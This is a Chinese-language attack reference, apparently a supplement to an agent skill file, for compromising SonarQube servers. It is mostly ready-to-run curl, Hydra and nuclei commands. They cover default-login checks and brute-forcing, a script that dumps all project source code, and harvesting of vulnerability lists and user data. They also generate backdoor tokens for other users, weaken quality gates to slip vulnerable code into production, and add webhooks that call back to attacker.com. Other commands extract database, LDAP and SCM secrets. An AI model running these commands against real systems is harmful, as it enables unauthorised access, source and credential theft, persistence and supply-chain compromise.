# SonarQube 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细 API 命令与技术补充。

---

## 1. 默认凭据与认证攻击

### 利用条件
- SonarQube 实例可达（默认 9000 端口）
- 出厂凭据 admin/admin 未修改
- `sonar.forceAuthentication` 设置为 false 时部分 API 无需认证

### 默认凭据验证

```bash
# 验证凭据有效性
curl -s -u admin:admin "http://TARGET:9000/api/authentication/validate"
# {"valid":true} 表示成功

# 获取当前用户信息与权限
curl -s -u admin:admin "http://TARGET:9000/api/users/current" | jq .

# 检查是否为管理员
curl -s -u admin:admin "http://TARGET:9000/api/users/current" | \
  jq '.permissions.global'
```

### 常见弱凭据字典

```bash
# 逐个尝试
for creds in "admin:admin" "admin:sonarqube" "admin:password" \
  "admin:admin123" "admin:sonar" "admin:123456" \
  "sonar:sonar" "test:test"; do
  result=$(curl -s -u "$creds" "http://TARGET:9000/api/authentication/validate" 2>/dev/null)
  echo "$creds -> $result"
done
```

### Web 表单爆破

```bash
# SonarQube 登录接口为 POST /api/authentication/login
# Hydra HTTP-POST 爆破
hydra -L users.txt -P passwords.txt TARGET -s 9000 \
  http-post-form "/api/authentication/login:login=^USER^&password=^PASS^:Authentication failed"

# 使用 nuclei 检测默认凭据
nuclei -t http/default-logins/sonarqube/ -u http://TARGET:9000
```

**攻击效果**: 获得 SonarQube 管理员权限，可访问所有项目源码和安全数据。

---

## 2. 源代码下载

### 利用条件
- 已获得有效凭据（或实例允许匿名访问）
- 目标用户对项目有浏览权限

### 项目枚举

```bash
# 列出所有项目（分页，每页最多 500）
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500" | \
  jq -r '.components[] | "\(.key)\t\(.name)"'

# 翻页获取更多项目
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500&p=2" | \
  jq -r '.components[].key'

# 获取项目详情
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?projects=PROJECT_KEY" | \
  jq '.components[]'

# 按关键词搜索项目
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?q=payment&ps=500" | \
  jq -r '.components[].key'
```

### 文件树遍历

```bash
# 获取项目所有文件（qualifiers=FIL 筛选文件）
curl -s -u admin:admin \
  "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=FIL" | \
  jq -r '.components[].key'

# 获取目录结构（qualifiers=DIR）
curl -s -u admin:admin \
  "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=DIR" | \
  jq -r '.components[].key'

# 按路径筛选
curl -s -u admin:admin \
  "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=FIL&q=.properties" | \
  jq -r '.components[].key'
```

### 单文件源码下载

```bash
# 原始源码下载（推荐）
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/raw?key=PROJECT_KEY:src/main/java/com/example/App.java" \
  -o App.java

# 带行号的源码（适合审计）
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/lines?key=PROJECT_KEY:pom.xml&from=1&to=9999" | \
  jq -r '.sources[] | "\(.line): \(.code)"'

# 查看 SCM 信息（谁在什么时候修改的）
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/scm?key=PROJECT_KEY:src/main/java/App.java" | jq .
```

### 批量下载全部源码

```bash
#!/bin/bash
# 批量下载项目全部源码
TARGET="http://TARGET:9000"
CREDS="admin:admin"
PROJECT="PROJECT_KEY"
OUTDIR="/tmp/sonar-dump/$PROJECT"

# 获取总文件数
total=$(curl -s -u "$CREDS" \
  "$TARGET/api/components/tree?component=$PROJECT&qualifiers=FIL&ps=1" | \
  jq '.paging.total')
echo "Total files: $total"

# 分页遍历并下载
page=1
while true; do
  files=$(curl -s -u "$CREDS" \
    "$TARGET/api/components/tree?component=$PROJECT&qualifiers=FIL&ps=500&p=$page" | \
    jq -r '.components[].key')
  [ -z "$files" ] && break
  for file in $files; do
    outpath="$OUTDIR/$file"
    mkdir -p "$(dirname "$outpath")"
    curl -s -u "$CREDS" "$TARGET/api/sources/raw?key=$file" -o "$outpath"
    echo "Downloaded: $file"
  done
  page=$((page + 1))
done
echo "Done. Files saved to $OUTDIR"
```

### 搜索敏感文件

```bash
# 搜索配置文件
for pattern in ".properties" ".yml" ".yaml" ".xml" ".env" ".config" ".json"; do
  curl -s -u admin:admin \
    "http://TARGET:9000/api/components/tree?component=PROJECT_KEY&ps=500&qualifiers=FIL&q=$pattern" | \
    jq -r '.components[].key'
done

# 搜索含密码的源码行
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/lines?key=PROJECT_KEY:application.properties&from=1&to=9999" | \
  jq -r '.sources[] | select(.code | test("password|secret|token|key"; "i")) | "\(.line): \(.code)"'
```

**攻击效果**: 获取目标组织全部项目源代码，可用于离线代码审计发现更多漏洞。

---

## 3. Issue 与漏洞枚举

### 利用条件
- 已获得有效凭据
- 目标项目包含扫描结果

### 漏洞优先级枚举

```bash
# CRITICAL 漏洞（最高优先级，直接可利用）
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&severities=CRITICAL&ps=500" | \
  jq '.issues[] | {rule: .rule, message: .message, component: .component, line: .line, severity: .severity}'

# BLOCKER 级别漏洞
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&severities=BLOCKER&ps=500" | \
  jq '.issues[]'

# 所有漏洞（按严重程度排序）
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&ps=500&s=SEVERITY&asc=no" | \
  jq '.issues[] | {severity: .severity, rule: .rule, component: .component}'
```

### 按规则类型搜索

```bash
# SQL 注入相关
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?rules=squid:S3649&ps=500" | jq '.issues[]'

# 硬编码凭据
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?ps=500" | \
  jq '.issues[] | select(.message | test("hardcoded|credential|password"; "i"))'

# XSS 相关
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?ps=500" | \
  jq '.issues[] | select(.rule | test("xss|injection"; "i"))'
```

### 按项目搜索

```bash
# 特定项目的所有漏洞
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?componentKeys=PROJECT_KEY&types=VULNERABILITY&ps=500" | \
  jq '.issues[] | {rule: .rule, message: .message, line: .line}'

# 特定项目的 Bug
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?componentKeys=PROJECT_KEY&types=BUG&ps=500" | \
  jq '.issues[] | {message: .message, component: .component}'
```

### 获取漏洞关联源码

```bash
# 获取 Issue 详情（含代码片段）
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?issues=ISSUE_KEY&additionalFields=_all" | \
  jq '.issues[0]'

# 获取漏洞所在文件的源码上下文
COMPONENT="PROJECT_KEY:src/main/java/Vuln.java"
LINE=42
curl -s -u admin:admin \
  "http://TARGET:9000/api/sources/lines?key=$COMPONENT&from=$((LINE-5))&to=$((LINE+5))" | \
  jq -r '.sources[] | "\(.line): \(.code)"'
```

### 批量导出所有 Issue

```bash
# 导出为 JSON 文件
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&ps=500" \
  -o /tmp/sonarqube-vulns.json

# 统计各严重级别数量
curl -s -u admin:admin \
  "http://TARGET:9000/api/issues/search?types=VULNERABILITY&facets=severities&ps=1" | \
  jq '.facets[0].values[]'
```

**攻击效果**: 获取目标代码的已知漏洞清单，可直接用于构造针对性攻击 payload。

---

## 4. Token 窃取与持久化

### 利用条件
- 管理员权限（查看/生成其他用户 Token）
- 或普通用户权限（管理自身 Token）

### 用户枚举

```bash
# 列出所有用户
curl -s -u admin:admin \
  "http://TARGET:9000/api/users/search?ps=500" | \
  jq '.users[] | {login: .login, name: .name, email: .email, active: .active, local: .local}'

# 列出用户组
curl -s -u admin:admin \
  "http://TARGET:9000/api/user_groups/search?ps=500" | \
  jq '.groups[] | {name: .name, description: .description, membersCount: .membersCount}'

# 查看特定组成员
curl -s -u admin:admin \
  "http://TARGET:9000/api/user_groups/users?name=sonar-administrators&ps=500" | \
  jq '.users[].login'
```

### Token 操作

```bash
# 查看用户已有 Token（仅返回名称和创建时间，不含明文）
curl -s -u admin:admin \
  "http://TARGET:9000/api/user_tokens/search?login=USERNAME" | \
  jq '.userTokens[]'

# 为目标用户生成新 Token（明文仅此次返回）
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/user_tokens/generate" \
  -d "name=svc-backup&login=USERNAME&type=USER_TOKEN" | jq .
# 记录返回的 token 字段

# 使用 Token 访问 API（Token 作为用户名，密码留空）
curl -s -u "squ_generated_token:" \
  "http://TARGET:9000/api/projects/search?ps=500" | jq '.components[].key'

# 撤销 Token（清理痕迹或破坏他人访问）
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/user_tokens/revoke" \
  -d "name=token-name&login=USERNAME"
```

### 全局 Token 枚举

```bash
# 遍历所有用户的 Token
for user in $(curl -s -u admin:admin \
  "http://TARGET:9000/api/users/search?ps=500" | jq -r '.users[].login'); do
  echo "=== $user ==="
  curl -s -u admin:admin \
    "http://TARGET:9000/api/user_tokens/search?login=$user" | \
    jq '.userTokens[]'
done
```

**攻击效果**: 生成的 Token 可绕过密码修改持续访问，实现持久化后门。

---

## 5. Quality Gate 绕过

### 利用条件
- 管理员权限（或具有 Quality Gate 管理权限）
- 目标组织 CI/CD 依赖 Quality Gate 结果

### 操作步骤

```bash
# 列出所有 Quality Gate
curl -s -u admin:admin \
  "http://TARGET:9000/api/qualitygates/list" | \
  jq '.qualitygates[] | {id: .id, name: .name, isDefault: .isDefault}'

# 查看 Quality Gate 的条件
curl -s -u admin:admin \
  "http://TARGET:9000/api/qualitygates/show?name=Sonar%20way" | \
  jq '.conditions[]'

# 创建宽松的 Quality Gate（所有检查条件极低或为空）
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/qualitygates/create" -d "name=Permissive"
# 记录返回的 id

# 将目标项目关联到宽松 Gate
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/qualitygates/select" \
  -d "gateId=PERMISSIVE_GATE_ID&projectKey=PROJECT_KEY"

# 设置为默认 Quality Gate（影响所有新项目）
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/qualitygates/set_as_default" \
  -d "id=PERMISSIVE_GATE_ID"
```

**攻击效果**: 使带有严重漏洞的代码通过质量门禁进入生产环境，实现供应链攻击。

---

## 6. Webhook 滥用

### 利用条件
- 管理员权限或项目管理权限
- 攻击者有可接收回调的服务器

### 操作步骤

```bash
# 列出全局 Webhook
curl -s -u admin:admin \
  "http://TARGET:9000/api/webhooks/list" | jq '.webhooks[]'

# 列出项目 Webhook
curl -s -u admin:admin \
  "http://TARGET:9000/api/webhooks/list?project=PROJECT_KEY" | jq '.webhooks[]'

# 创建全局 Webhook（所有项目分析完成后回调）
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/webhooks/create" \
  -d "name=audit-hook&url=https://attacker.com/sonar-callback"

# 创建项目 Webhook
curl -s -X POST -u admin:admin \
  "http://TARGET:9000/api/webhooks/create" \
  -d "name=notify&url=https://attacker.com/hook&project=PROJECT_KEY"

# 查看 Webhook 投递记录
curl -s -u admin:admin \
  "http://TARGET:9000/api/webhooks/deliveries?componentKey=PROJECT_KEY" | \
  jq '.deliveries[]'
```

**攻击效果**: 每次代码分析完成后自动回调，可持续获取项目质量数据和变更通知。

---

## 7. 配置提取

### 利用条件
- 管理员权限

### 全局配置导出

```bash
# 导出全部配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | jq '.settings[]'

# 过滤敏感配置项
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | test("password|token|secret|jdbc|ldap|smtp|scm|github|gitlab|bitbucket|azure|credential"; "i"))'

# 数据库连接信息
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values?keys=sonar.jdbc.url,sonar.jdbc.username,sonar.jdbc.password" | jq .

# LDAP 配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | startswith("sonar.security.realm") or startswith("ldap."))'

# SMTP 邮件配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values?keys=email.smtp_host.secured,email.smtp_port.secured,email.smtp_username.secured" | jq .

# SCM（源码管理）配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | test("sonar.scm|sonar.links.scm"; "i"))'
```

### ALM 集成提取

```bash
# GitHub 集成配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | startswith("sonar.auth.github"))'

# GitLab 集成配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | startswith("sonar.auth.gitlab"))'

# Azure DevOps 集成配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | startswith("sonar.pullrequest.provider") or startswith("sonar.alm"))'
```

**攻击效果**: 获取数据库凭据、LDAP 绑定密码、SCM Token 等，用于横向移动。

---

## 8. 插件分析

### 利用条件
- 已获得有效凭据

### 枚举与分析

```bash
# 列出已安装插件
curl -s -u admin:admin \
  "http://TARGET:9000/api/plugins/installed" | \
  jq '.plugins[] | {key: .key, name: .name, version: .version}'

# 检查可用更新（可能暴露旧版本漏洞）
curl -s -u admin:admin \
  "http://TARGET:9000/api/plugins/updates" | \
  jq '.plugins[] | {key: .key, version: .version, updates: [.updates[].version]}'

# 关注的高价值插件
# - LDAP 插件: 可能含 LDAP 绑定凭据
# - GitHub/GitLab 插件: 可能含 OAuth Token
# - SAML 插件: 可能含证书和私钥
# - Branch 插件: 可能暴露分支结构信息

# 获取插件相关配置
curl -s -u admin:admin \
  "http://TARGET:9000/api/settings/values" | \
  jq '.settings[] | select(.key | test("ldap|saml|github|gitlab"; "i"))'
```

**攻击效果**: 识别攻击面（LDAP/SAML 凭据）和潜在的插件漏洞。

---

## 9. 批量数据导出

### 项目元数据

```bash
# 导出所有项目
curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500" | \
  jq '.components[]' > /tmp/sonar-projects.json
```

### Issue 全量导出

```bash
# 漏洞全量导出（分页）
page=1
while true; do
  result=$(curl -s -u admin:admin \
    "http://TARGET:9000/api/issues/search?types=VULNERABILITY&ps=500&p=$page")
  count=$(echo "$result" | jq '.issues | length')
  [ "$count" -eq 0 ] && break
  echo "$result" | jq '.issues[]' >> /tmp/sonar-vulns.json
  page=$((page + 1))
done
```

### Hotspot 导出

```bash
# 安全热点导出
curl -s -u admin:admin \
  "http://TARGET:9000/api/hotspots/search?ps=500" | \
  jq '.hotspots[]' > /tmp/sonar-hotspots.json
```

### 度量数据导出

```bash
# 遍历所有项目导出度量
for project in $(curl -s -u admin:admin \
  "http://TARGET:9000/api/projects/search?ps=500" | jq -r '.components[].key'); do
  echo "=== $project ==="
  curl -s -u admin:admin \
    "http://TARGET:9000/api/measures/component?component=$project&metricKeys=bugs,vulnerabilities,code_smells,security_hotspots,coverage,ncloc,duplicated_lines_density" | \
    jq '.component.measures[]'
done > /tmp/sonar-measures.json
```

### 活动日志导出

```bash
# 计算引擎任务历史（可了解项目分析频率和最后分析时间）
curl -s -u admin:admin \
  "http://TARGET:9000/api/ce/activity?ps=500" | \
  jq '.tasks[] | {component: .componentName, status: .status, submittedAt: .submittedAt}'
```

**攻击效果**: 完整导出目标组织的代码质量与安全数据，可离线分析制定后续攻击计划。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| curl + jq | 系统自带 | SonarQube REST API 全量交互 |
| nmap | https://nmap.org | 端口发现与服务识别 |
| nuclei | https://github.com/projectdiscovery/nuclei | SonarQube 默认凭据与 CVE 模板扫描 |
| hydra | https://github.com/vanhauser-thc/thc-hydra | Web 表单凭据爆破 |
| sonar-scanner | https://docs.sonarqube.org/latest/analysis/scan/sonarscanner/ | 官方扫描器，理解分析流程 |
